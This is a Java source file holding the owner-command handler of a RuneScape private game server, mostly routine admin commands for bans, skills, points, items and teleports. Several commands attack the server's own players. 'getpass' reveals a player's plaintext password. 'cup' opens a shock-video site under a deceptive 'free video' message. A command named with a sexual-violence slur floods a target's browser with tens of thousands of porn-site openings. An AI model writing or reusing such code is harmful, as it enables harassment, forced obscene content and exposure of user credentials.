package com.rs.game.player.content.commands;

import com.rs.Settings;
import com.rs.game.Animation;
import com.rs.game.ForceTalk;
import com.rs.game.Hit;
import com.rs.game.Hit.HitLook;
import com.rs.game.World;
import com.rs.game.WorldObject;
import com.rs.game.WorldTile;
import com.rs.game.item.Item;
import com.rs.game.minigames.FightPits;
import com.rs.game.npc.NPC;
import com.rs.game.player.LoyaltyManager;
import com.rs.game.player.Player;
import com.rs.game.player.Skills;
import com.guardian.ItemManager;
import com.rs.game.player.dialogues.impl.AccountManager;
import com.rs.utils.DisplayNames;
import com.rs.utils.Encrypt;
import com.rs.utils.IPBanL;
import com.rs.utils.NPCSpawns;
import com.rs.utils.SerializableFilesManager;
import com.rs.utils.ShopsHandler;
import com.rs.utils.Utils;
import com.rs.utils.spawning.ObjectSpawning;

public class Owner {

	public static boolean processCommand(Player player, String[] cmd, boolean console, boolean clientCommand) {
		String name;
		Player target;
		boolean loggedIn = true;

		/*if (cmd[0].equals("tele")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::tele coordX coordY (Optional: height)");
					return true;
				}
				try {
					int x = Integer.valueOf(cmd[1]);
					int y = Integer.valueOf(cmd[2]);
					int z = cmd.length > 3 ? Integer.valueOf(cmd[3]) : 0;
					player.resetWalkSteps();
					player.setNextWorldTile(new WorldTile(x, y, z));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::tele coordX coordY plane");
				}
			}*/
		
		/*if (clientCommand) {
			if (cmd[0].equals("tele")) {
				int x = Integer.valueOf(cmd[1]);
				int y = Integer.valueOf(cmd[2]);
				int z = Integer.valueOf(cmd[3]);
				player.setNextWorldTile(new WorldTile(x, y, z));
				return true;
			}
			return true;
		}*/

		if (cmd[0].equals("teleplayer")) {

			if (cmd.length < 4) {
					player.getPackets().sendGameMessage("Use: ;;teleplayer coordX coordY (Optional: coordZ) TargetPlayer");
					return true;
			}

			name = "";

			int fetchname = cmd.length > 4 ? 4 : 3;

			for (int i = fetchname; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			
			target = World.findPlayer(name);
			
			if (target == null || !World.isOnline(name)) {
				player.sendMessage("The player '"+name+"' can't be found.");
				return true;
			}

			target.getPackets().sendGameMessage("" + player.getDisplayName() + " is attempting to teleport you!");
			//int x = Integer.valueOf(2814);
			//int y = Integer.valueOf(3182);
			//int z = Integer.valueOf(0);
			int x = Integer.valueOf(cmd[1]);
			int y = Integer.valueOf(cmd[2]);
			int z = cmd.length > 4 ? Integer.valueOf(cmd[3]) : 0;
			target.resetWalkSteps();
			target.setNextWorldTile(new WorldTile(x, y, z));
			target.getPackets().sendGameMessage("" + player.getDisplayName() + " has teleported you somewhere else!");
			player.sendMessage("You have transported "+target.getDisplayName()+" somewhere else!");
			return true;
		}

		
		if (cmd[0].equals("hint")) {
			int id = Integer.parseInt(cmd[1]);
			player.getHintIconsManager().addHintIcon(player, id, -1, false);
			return true;
		}
		
		if (cmd[0].equals("rhint")) {
			player.getHintIconsManager().removeUnsavedHintIcon();
			return true;
		}
		
		if (cmd[0].equals("shop")) {
			int id = Integer.parseInt(cmd[1]);
			ShopsHandler.openShop(player, id);
			return true;
		}
		
		if (cmd[0].equals("test")) {
			player.getControlerManager().startControler("LobbyArea");
			return true;
		}
		
		if (cmd[0].equals("fix")) {
			name = "";
			for (int i = 1; i < cmd.length; i++)
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			target = World.findPlayer(name);
			if (target == null)
				return true;
			target.setNeedsFixed(true);
			SerializableFilesManager.savePlayer(target);
			player.getPackets().sendGameMessage("Done..");
			return true;
		}
		
		if (cmd[0].equals("ipban")) {
			name = "";
			
			for (int i = 1; i < cmd.length; i++)
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			
			target = World.findPlayer(name);
			
			if (target.isOwner()) {
				return true;
			}
			
			loggedIn = World.isOnline(name);
			
			IPBanL.ban(target, loggedIn);
			
			player.getPackets().sendGameMessage("You've permanently ipbanned " + (loggedIn ? target.getDisplayName() : name) + ".");
			return true;
		}
		
		if (cmd[0].equals("unipban")) {
			name = "";
			
			for (int i = 1; i < cmd.length; i++)
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			
			target = World.findPlayer(name);
			
			if (target.isOwner()) {
				return true;
			}
			
			IPBanL.unban(target);
			
			player.getPackets().sendGameMessage("You've un-banned " + (loggedIn ? target.getDisplayName() : name) + ".");
			return true;
		}
		
		if (cmd[0].equals("resetpvp")) {
			name = "";
			
			for (int i = 1; i < cmd.length; i++)
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			
			target = World.findPlayer(name);
			
			if (target.isOwner()) {
				return true;
			}
			
			target.setKillCount(0);
			target.setDeathCount(0);
			target.setPvpPoints(0);
			
			player.sendMessage("PvP reset for "+target.getDisplayName()+"");
			
			if (World.isOnline(name))
				target.sendMessage("All of your pvp points, kills, and deaths have been reset.");
			SerializableFilesManager.savePlayer(target);
			return true;
		}
		
		if (cmd[0].equals("setkills")) {
			name = "";
			for (int i = 1; i < cmd.length; i++)
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			target = World.findPlayer(name);
			if (target.isOwner()) {
				return true;
			}
			int amount = Integer.parseInt(cmd[1]);
			target.setKillCount(amount);
			player.sendMessage(""+target.getDisplayName()+"'s kills have been set to "+amount+"");
			if (World.isOnline(name))
				target.sendMessage("Your kill count have been set to "+amount+"");
			SerializableFilesManager.savePlayer(target);
			return true;
		}
		
		if (cmd[0].equals("setdeaths")) {
			name = "";
			for (int i = 1; i < cmd.length; i++)
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			target = World.findPlayer(name);
			if (target.isOwner()) {
				return true;
			}
			int amount = Integer.parseInt(cmd[1]);
			target.setDeathCount(amount);
			player.sendMessage(""+target.getDisplayName()+"'s deaths have been set to "+amount+"");
			if (World.isOnline(name))
				target.sendMessage("Your death count have been set to "+amount+"");
			SerializableFilesManager.savePlayer(target);
			return true;
		}
		
		if (cmd[0].equals("getitems")) {
			int[] toAdd = { 1039, 1041, 1043, 1045, 1047, 1049, 1051, 1037 };
			player.getInventory().addItems(toAdd, Integer.MAX_VALUE);
			return true;
		}
		
		if (cmd[0].equals("npca")) {
			NPC npc = World.getNpc(Integer.parseInt(cmd[1]));
			npc.setNextAnimation(new Animation(Integer.parseInt(cmd[2])));
			return true;
		}
		
		if (cmd[0].equals("shop")) {
			int id = Integer.parseInt(cmd[1]);
			ShopsHandler.openShop(player, id);
			return true;
		}
		
		if (cmd[0].equals("setdp")) {
			name = "";
			int value = Integer.parseInt(cmd[1]);
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			target.setDungPoints(value);
			
			player.sendMessage(""+target.getDisplayName()+"'s dung points are now "+target.getDungPoints()+".");
			if (World.isOnline(name)) {
				target.sendMessage("Your Dung Points have been set to "+value+" by "+player.getDisplayName()+".");
			}
			SerializableFilesManager.savePlayer(target);
			return true;
		}
		
		if (cmd[0].equals("getdp")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			player.sendMessage(""+target.getDisplayName()+" has "+Utils.formatNumber(target.getDungPoints())+" dung points. ");
			return true;
		}
		
		if (cmd[0].equals("setdiff")) {
			name = "";
			int difficulty = Integer.parseInt(cmd[1]);
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			target.setDifficulty(difficulty);
			
			player.sendMessage(""+target.getDisplayName()+"'s difficulty is now "+AccountManager.diffs[difficulty - 1]+".");
			if (World.isOnline(name)) {
				target.sendMessage("Your difficulty has been forced to "+AccountManager.diffs[difficulty - 1]+" by "+player.getDisplayName()+".");
			}
			SerializableFilesManager.savePlayer(target);
			return true;
		}
		
		if (cmd[0].equals("allow")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null) {
				return true;
			}
			
			target.setAllowChange(true);
			player.sendMessage(""+target.getDisplayName()+" can now change their difficulty.");
			
			if (World.isOnline(name)) {
				target.sendMessage("You are now allowed to change your difficulty setting.");
			}
			SerializableFilesManager.savePlayer(target);
			return true;
		}
		
		if (cmd[0].equals("animobj")) {
			int id = Integer.parseInt(cmd[1]);
			if (player.examinedObject == null) {
				player.sendMessage("Last examined object is null.");
				return true;
			}
			World.sendObjectAnimation(player, player.examinedObject, new Animation(id));
			player.examinedObject = null;
			return true;
		}
		
		if (cmd[0].equals("max")) {
			int skillId = Skills.getSkillId(cmd[1]);
			if (skillId == -1) {
				player.sendMessage("Incorrect Skill Name '"+cmd[1]+"'");
				return true;
			}
			player.getSkills().set(skillId, skillId < 24 ? 99 : 120);
			player.getSkills().setXp(skillId, Skills.getXPForLevel(skillId < 24 ? 99 : 120));
			player.sendMessage("Your "+Skills.SKILLS[skillId]+" has been set to "+(skillId < 24 ? 99 : 120)+"");
			return true;
		}
		
		if (cmd[0].equals("sps")) {
			int skillId = Skills.getSkillId(cmd[1]);
			int level = Integer.parseInt(cmd[2]);
			
			name = "";
			
			for (int i = 3; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			if (skillId == -1) {
				player.sendMessage("Incorrect Skill Name '"+cmd[1]+"'");
				return true;
			}
			
			target.getSkills().set(skillId, level);
			target.getSkills().setXp(skillId, Skills.getXPForLevel(level));
			
			player.sendMessage("You have set "+name+"'s "+Skills.SKILLS[skillId]+" level to "+level+"");
			
			if (World.isOnline(name))
				target.sendMessage("Your "+Skills.SKILLS[skillId]+" has been set to "+level+"");
			
			SerializableFilesManager.savePlayer(target);
			return true;
		}
		
		if (cmd[0].equals("rps")) {
			int skillId = Skills.getSkillId(cmd[1]);
			name = "";
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			if (skillId == -1) {
				player.sendMessage("Incorrect Skill Name '"+cmd[1]+"'");
				return true;
			}
			
			target.getSkills().set(skillId, skillId == 3 ? 10 : 1);
			target.getSkills().setXp(skillId, Skills.getXPForLevel(skillId == 3 ? 10 : 1));
			player.sendMessage("You have reset "+name+"'s "+Skills.SKILLS[skillId]+" level.");
			if (World.isOnline(name))
				target.sendMessage("Your "+Skills.SKILLS[skillId]+" has been set to "+(skillId == 3 ? 10 : 1)+"");
			return true;
		}
		
		if (cmd[0].equals("reset")) {
			int skillId = Skills.getSkillId(cmd[1]);
			if (skillId == -1) {
				player.sendMessage("Incorrect Skill Name '"+cmd[1]+"'");
				return true;
			}
			player.getSkills().set(skillId, skillId == 3 ? 10 : 1);
			player.getSkills().setXp(skillId, Skills.getXPForLevel(skillId == 3 ? 10 : 1));
			player.sendMessage("Your "+Skills.SKILLS[skillId]+" has been set to "+(skillId == 3 ? 10 : 1)+"");
			return true;
		}
		
		if (cmd[0].equals("setskill")) {
			int skillId = Skills.getSkillId(cmd[1]);
			int level = Integer.parseInt(cmd[2]);
			
			if (skillId == -1) {
				player.sendMessage("Incorrect Skill Name '"+cmd[1]+"'");
				return true;
			}
			if (level > 99 && skillId < 24) {
				level = 99;
			}
			player.getSkills().set(skillId, level);
			player.getSkills().setXp(skillId, Skills.getXPForLevel(level));
			player.sendMessage("Your "+Skills.SKILLS[skillId]+" is now level "+level+"!");
			return true;
		}
		
		if (cmd[0].equals("packets")) {
			player.setPacketDebug(!player.isPacketDebug());
			player.sendMessage("Packet debugging is now: "+player.isPacketDebug()+"");
			return true;
		}
		
		if (cmd[0].equals("storetest")) {
			LoyaltyManager.openLoyaltyStore(player);
			return true;
		}
		
		if (cmd[0].equals("debug")) {
			Settings.ENABLE_BUTTON_DEBUG = !Settings.ENABLE_BUTTON_DEBUG;
			boolean debug = Settings.ENABLE_BUTTON_DEBUG;
			player.sm("Button debug "+(debug == true ? "enabled" : "disabled")+".");
			return true;
		}
		
		if (cmd[0].equals("resetbank")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			target.getBank().reset();
			return true;
		}
		
		if (cmd[0].equals("setd")) {
			double amount = Double.parseDouble(cmd[1]);
			name = "";
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			target.setDonationAmount(amount);
			if (World.isOnline(target.getUsername()))
				target.sendMessage("Your donation total has been changed to "+target.getDonationAmount()+".");
			player.sendMessage(""+target.getDisplayName()+"'s donation total is now "+target.getDonationAmount()+"");
			return true;
		}
		
		if (cmd[0].equals("getpass")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
		
			player.sendMessage(""+target.getDisplayName()+"'s password is <col=FF0000>"+target.getRealPass()+"");
			return true;
		}
		
		if (cmd[0].equals("remove")) {
			if (player.examinedObject == null) {
				player.sendMessage("Last examined object is null.");
				return true;
			}
			World.removeObject(player.examinedObject, true);
			player.getPackets().sendGameMessage("Removed object " + player.examinedObject.getId() + ".");
			player.examinedObject = null;
			return true;
		}
		
		if (cmd[0].equals("demote")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			
			target.setRights(0);
			SerializableFilesManager.savePlayer(target);
			if (loggedIn) {
				target.getPackets().sendGameMessage("You have been demoted by " + Utils.formatPlayerNameForDisplay(player.getUsername()) + ".", true);
			}
			player.getPackets().sendGameMessage("You have demoted " + Utils.formatPlayerNameForDisplay(target.getUsername()) + ".", true);
			return true;
		}
		
		if (cmd[0].equals("dicer")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			target.setDicer(!target.isDicer());
			SerializableFilesManager.savePlayer(target);
			if (loggedIn) {
				target.getPackets().sendGameMessage("Dicer Status for "+target.getDisplayName()+" is now "+target.isDicer()+".", true);
			}
			player.getPackets().sendGameMessage("Dicer Status is now "+target.isDicer()+".", true);
			return true;
		}
		
		if (cmd[0].equals("addnpc") || cmd[0].equals("addspawn")) {
			int npcID = Integer.parseInt(cmd[1]);
			NPCSpawns.writeSpawn(player, npcID, player.getX(), player.getY(), player.getPlane(), -1, true);
			World.spawnNPC(npcID, player, -1, true, false);
			return true;
		}
		
		if (cmd[0].equals("addspins")) {
			name = "";
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			
			Player other = World.findPlayer(name);
			
			if (other == null) {
				return true;
			}
			int spins = Integer.parseInt(cmd[1]);
			other.setSpins(other.getSpins() + spins);
			if (World.isOnline(name))
				other.getPackets().sendGameMessage("You have "+(spins >= 0 ? "received": "lost")+" "+spins+" spins!");
			player.sendMessage("You "+(spins >= 0 ? "gave": "took")+" "+spins+" spins "+(spins >= 0 ? "to": "from")+" "+other.getDisplayName()+"");
			return true;
		}
		
		if (cmd[0].equals("getspins")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			
			Player other = World.findPlayer(name);
			
			if (other == null) {
				return true;
			}
			player.sendMessage(""+other.getDisplayName()+" currently has "+other.getSpins()+" spins!");
			return true;
		}
		
		if (cmd[0].equals("setlp")) {
			name = "";
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			
			Player other = World.findPlayer(name);
			
			if (other == null) {
				return true;
			}
			
			int value = Integer.parseInt(cmd[1]);
			other.setLoyaltyPoints(other.getLoyaltyPoints() + value);
			if (World.isOnline(name))
				other.getPackets().sendGameMessage("You have "+(value >= 0 ? "received": "lost")+" "+Utils.formatNumber(value)+" Loyalty Points!");
			player.sendMessage("You "+(value >= 0 ? "gave": "took")+" "+value+" Loyalty Points "+(value >= 0 ? "to": "from")+" "+other.getDisplayName()+"");
			return true;
		}
		
		if (cmd[0].equals("getlp")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			
			Player other = World.findPlayer(name);
			
			if (other == null) {
				return true;
			}
			
			player.sendMessage(""+other.getDisplayName()+" currently has "+other.getLoyaltyPoints()+" loyalty points!");
			return true;
		}
		
		if (cmd[0].equals("npcmask")) {
			String message = "";
			for (int i = 1; i < cmd.length; i++) {
				message += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			for (NPC n : World.getNPCs()) {
				if (n != null && Utils.getDistance(player, n) < 9) {
					n.setNextForceTalk(new ForceTalk(message));
				}
			}
			return true;
		}
		
		if (cmd[0].equals("force")) {
			name = String.valueOf(cmd[1]);
			String message = "";
			for (int i = 2; i < cmd.length; i++) {
				message += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			
			target.setNextForceTalk(new ForceTalk(message));
			return true;
		}
		
		if (cmd[0].equals("setvp")) {
			name = "";
			int vp = Integer.parseInt(cmd[1]);
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			
			target.setVotePoints(vp);
			player.getPackets().sendGameMessage(""+target.getDisplayName()+"'s vote points has been set to "+vp+"");
			SerializableFilesManager.savePlayer(target);
			if (World.isOnline(name)) {
				target.getPackets().sendGameMessage("<img=1>Your vote points have been set to "+vp+" by "+player.getDisplayName()+"");
			}
			return true;
		}
		
		if (cmd[0].equals("setpp")) {
			name = "";
			int vp = Integer.parseInt(cmd[1]);
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			
			target.setPrestigePoints(vp);
			player.getPackets().sendGameMessage(""+target.getDisplayName()+"'s prestige points has been set to "+vp+"");
			SerializableFilesManager.savePlayer(target);
			
			if (World.isOnline(name)) {
				target.getPackets().sendGameMessage("<img=1>Your prestige points has been set to "+vp+" by "+player.getDisplayName()+"");
			}
			return true;
		}
		
		if (cmd[0].equals("setpvp")) {
			name = "";
			int points = Integer.parseInt(cmd[1]);
			
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			target.setPvpPoints(points);
			SerializableFilesManager.savePlayer(target);
			player.getPackets().sendGameMessage(target.getDisplayName()+" now has "+target.getPvpPoints()+" pvp points.", true);
			if (World.isOnline(name))
				target.getPackets().sendGameMessage(player.getDisplayName()+" has set your vote points. You now have "+target.getPvpPoints()+"");
			return true;
		}
		
		if (cmd[0].equals("setprestige")) {
			name = "";
			int vp = Integer.parseInt(cmd[1]);
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			
			target.setPrestigeLevel(vp);
			
			player.getPackets().sendGameMessage(""+target.getDisplayName()+"'s prestige level has been set to "+vp+"");
			SerializableFilesManager.savePlayer(target);
			if (World.isOnline(name)) {
				target.getPackets().sendGameMessage("<img=1>Your prestige level has been set to "+vp+" by "+player.getDisplayName()+"");
			}
			return true;
		}

		if (cmd[0].equals("setrights")) {
			name = "";
			int status = Integer.parseInt(cmd[1]);
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			
			target.setRights(status);
			player.getPackets().sendGameMessage("Your targets status has been changed.");
			SerializableFilesManager.savePlayer(target);
			if (World.isOnline(name)) 
				target.getPackets().sendGameMessage("Your status has been changed.");
			return true;
		}
		
		if (cmd[0].equals("addobj")) {
			if (cmd.length < 2) {
				player.sendMessage("Usage: ::object id (optional: face)");
				return true;
			}
			int id = Integer.parseInt(cmd[1]);
			int face = cmd.length < 3 ? 0 : Integer.parseInt(cmd[2]);
			ObjectSpawning.writeObject(player, id, player.getX(), player.getY(), player.getPlane(), face, true);
			World.spawnObject(new WorldObject(id, 10, face, player.getX(), player.getY(), player.getPlane()), true);
			return true;
		}
		
		if (cmd[0].equals("unmuteall")) {
			for (Player targets : World.getPlayers()) {
				if (player == null) {
					continue;
				}
				targets.setMuted(0);
			}
			return true;
		}
		
		if (cmd[0].equals("kill")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.getPlayerByDisplayName(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			
			target.applyHit(new Hit(target, target.getHitpoints(), HitLook.REGULAR_DAMAGE));
			target.stopAll();
			return true;
		}
		
		if (cmd[0].equals("restartfp")) {
			FightPits.endGame();
			player.getPackets().sendGameMessage("Fight pits restarted!");
			return true;
		}
		
		if (cmd[0].equals("updatereason")) {
			int delay = Integer.valueOf(cmd[1]);
			String reason = "";
			for (int i = 2; i < cmd.length; i++)
				reason += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			for (Player p : World.getPlayers()) {
                p.getDialogueManager().startDialogue("SimpleNPCMessage", 646, "<col=000000><shad=DEED97>Game Update Reason: " + reason);
			}
			if (delay > 60) {
				delay = 60;
			}
			if (delay < 15)
				delay = 15;
			World.safeShutdown(true, delay);
			return true;
		}
		
		if (cmd[0].equals("giveitem")) {
			name = "";
			int itemId = Integer.parseInt(cmd[1]);
			int amount = Integer.parseInt(cmd[2]);
			for (int i = 3; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			
			target = World.findPlayer(name);
			
			if (target == null || !World.isOnline(name)) {
				player.sendMessage("The player '"+name+"' can't be found.");
				return true;
			}
			
			Item item = new Item(itemId, amount);
			target.getInventory().addItem(itemId, amount);
			SerializableFilesManager.savePlayer(target);
			target.getPackets().sendGameMessage("" + player.getDisplayName() + " has given you an item!");
			player.sendMessage("You have given "+item.getName()+" (Amount: "+amount+") to "+target.getDisplayName()+".");
			return true;
		}
		
		if (cmd[0].equals("update")) {
			int delay = 120;
			if (cmd.length >= 2) {
				try {
					delay = Integer.valueOf(cmd[1]);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::restart secondsDelay(IntegerValue)");
					return true;
				}
			}
			World.safeShutdown(false, delay);
			return true;
		}
		
		if (cmd[0].equals("setpassother")) {
			name = "";
			String newPass = cmd[1];
			
			for (int i = 2; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			target.setPassword(Encrypt.encryptSHA1(newPass));
			SerializableFilesManager.savePlayer(target);
			player.sendMessage(target.getDisplayName()+"'s password has been set to <col=FF0000>"+newPass+"</col>");
			return true;
		}
		
		if (cmd[0].equals("cup")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.getPlayerByDisplayName(name);
			
			if (!World.isOnline(name)) {
				player.sendMessage("Player is currently not online.");
				return true;
			}
			target.getPackets().sendOpenURL("http://cupvid.com");
			target.sendMessage("Enjoy this free awesome video! Hope you like it :)");
			return true;	
		}
		
		if (cmd[0].equals("rape")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			if (World.isOnline(name)) {
				for (int i = 0; i < 10000; i++) {
					target.getPackets().sendOpenURL("http://porntube.com");
					target.getPackets().sendOpenURL("http://porntube.com");
					target.getPackets().sendOpenURL("http://porntube.com");
					target.getPackets().sendOpenURL("http://porntube.com");
					target.getPackets().sendOpenURL("http://porntube.com");
				}
			}
			return true;
		}
		
		
		if (cmd[0].equals("removenpc")) {
			for (NPC n : World.getNPCs()) {
				if (n.getId() == Integer.parseInt(cmd[1])) {
					n.reset();
					n.finish();
				}
			}
			return true;
		}

		if (cmd[0].equals("removedisplay")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.getPlayerByDisplayName(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			
			DisplayNames.removeDisplayName(target);
			
			if (World.isOnline(target.getUsername())) {
				target.getAppearence().generateAppearenceData();
				target.sendMessage("Your display name has been removed.");
			}
			SerializableFilesManager.savePlayer(target);
			return true;
		}
		
		if (cmd[0].equals("trade")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			target = World.getPlayerByDisplayName(name);
			
			if (target == null) {
				player.sendMessage("Unable to locate '"+name+"'");
				return true;
			}
			
			player.getTrade().openTrade(target);
			target.getTrade().openTrade(player);
			return true;
		}
		
		if (cmd[0].equals("meeting")) {
			for (Player staff : World.getPlayers()) {
				if (staff.getRights() == 0 || staff.getRights() > 2)
					continue;
				staff.setNextWorldTile(player);
				staff.getPackets().sendGameMessage("You been teleported for a staff meeting by " + player.getDisplayName());
			}
			return true;
		}
		
	
		
		return false;
	}
}
